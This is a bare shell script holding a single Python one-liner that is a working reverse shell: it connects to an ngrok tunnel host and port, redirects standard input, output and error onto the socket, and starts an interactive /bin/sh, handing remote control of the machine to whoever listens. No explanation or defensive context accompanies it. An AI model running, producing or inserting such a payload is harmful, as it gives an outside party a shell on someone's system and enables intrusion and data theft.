#!/bin/sh
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("0.tcp.jp.ngrok.io",10478));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'


